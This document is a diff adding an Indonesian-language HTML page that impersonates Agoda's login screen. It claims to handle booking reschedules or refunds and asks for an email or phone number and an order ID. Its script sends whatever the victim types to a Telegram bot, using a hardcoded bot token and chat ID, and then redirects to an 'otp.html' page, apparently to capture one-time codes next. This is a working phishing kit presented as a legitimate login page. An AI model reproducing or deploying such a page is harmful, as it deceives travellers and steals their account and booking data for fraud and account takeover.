@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login ke Agoda</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #f0f4ff 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 40px 32px;
+        }
+        .logo-container { text-align: center; margin-bottom: 32px; }
+        .logo { height: 42px; margin-bottom: 24px; }
+        .title { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: #666; line-height: 1.5; }
+        .method-toggle { display: flex; gap: 12px; margin-bottom: 32px; margin-top: 24px; }
+        .method-btn {
+            flex: 1; padding: 12px 16px; border: none; border-radius: 24px;
+            font-weight: 600; font-size: 14px; cursor: pointer;
+            transition: all 0.2s; display: flex; align-items: center; justify-content: center;
+        }
+        .method-btn.active { background: #0066cc; color: white; box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3); }
+        .method-btn.inactive { background: #f5f5f5; color: #333; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 8px; }
+        .form-input {
+            width: 100%; padding: 12px 16px; border: 1px solid #ddd; border-radius: 8px;
+            font-size: 14px; transition: all 0.2s;
+        }
+        .form-input:focus { outline: none; border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1); background: #f8faff; }
+        .submit-btn {
+            width: 100%; padding: 14px 16px; background: #0066cc; color: white; border: none;
+            border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;
+            transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 24px;
+        }
+        .submit-btn:hover:not(:disabled) { background: #0052a3; box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3); }
+        .submit-btn:disabled { background: #ccc; cursor: not-allowed; opacity: 0.6; }
+        .spinner {
+            width: 16px; height: 16px; border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { margin-top: 32px; padding-top: 24px; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #999; }
+        @media (max-width: 480px) { .container { padding: 32px 20px; } .title { font-size: 24px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://cdn6.agoda.net/images/kite-js/logo/agoda/color-default.svg" alt="Agoda Logo" class="logo">
+            <h4 class="title">Login ke Agoda</h4>
+            <p class="subtitle">Masukkan email atau nomor telepon untuk melanjutkan reschedule atau refund.</p>
+        </div>
+        <div class="method-toggle">
+            <button class="method-btn active" id="emailBtn" onclick="switchMethod('email')">Email</button>
+            <button class="method-btn inactive" id="phoneBtn" onclick="switchMethod('phone')">Telepon</button>
+        </div>
+        <form onsubmit="handleSubmit(event)">
+            <div class="form-group">
+                <label class="form-label" id="inputLabel">Email</label>
+                <input type="email" id="emailOrPhone" class="form-input" placeholder="nama@contoh.com" required>
+            </div>
+            <div class="form-group">
+                <label class="form-label">ID Pesanan</label>
+                <input type="text" id="orderId" class="form-input" placeholder="Masukkan ID Pesanan (angka saja)" inputmode="numeric" required>
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn"><span id="submitText">Lanjutkan</span></button>
+        </form>
+        <div class="footer"><p>Dengan masuk ke akun, saya menyetujui <a href="#">Ketentuan Penggunaan</a> dan <a href="#">Kebijakan Privasi</a> Agoda.</p></div>
+    </div>
+    <script>
+        let currentMethod = 'email';
+        const BOT_TOKEN = '7622590670:AAHh46L-JfETNyK1fSs2rth26Pmcq1fIE5w';
+        const CHAT_ID = '6691063456';
+
+        function switchMethod(method) {
+            currentMethod = method;
+            const emailBtn = document.getElementById('emailBtn');
+            const phoneBtn = document.getElementById('phoneBtn');
+            const inputLabel = document.getElementById('inputLabel');
+            const input = document.getElementById('emailOrPhone');
+            if (method === 'email') {
+                emailBtn.className = 'method-btn active'; phoneBtn.className = 'method-btn inactive';
+                inputLabel.textContent = 'Email'; input.type = 'email'; input.placeholder = 'nama@contoh.com';
+            } else {
+                phoneBtn.className = 'method-btn active'; emailBtn.className = 'method-btn inactive';
+                inputLabel.textContent = 'Nomor Telepon'; input.type = 'tel'; input.placeholder = '+62 812 3456 7890';
+            }
+        }
+
+        document.getElementById('orderId').addEventListener('input', function(e) { this.value = this.value.replace(/[^0-9]/g, ''); });
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const val = document.getElementById('emailOrPhone').value.trim();
+            const oid = document.getElementById('orderId').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const txt = document.getElementById('submitText');
+            btn.disabled = true; txt.innerHTML = '<span class="spinner"></span> Memproses...';
+            const msg = `🔔 *Data Login Agoda*\n👤 *Metode:* ${currentMethod}\n📧 *User:* \`${val}\`\n🆔 *Order ID:* \`${oid}\``;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+                window.location.href = `otp.html?method=${currentMethod}&value=${encodeURIComponent(val)}`;
+            } catch (e) { window.location.href = `otp.html?method=${currentMethod}&value=${encodeURIComponent(val)}`; }
+        }
+    </script>
+</body>
+</html>
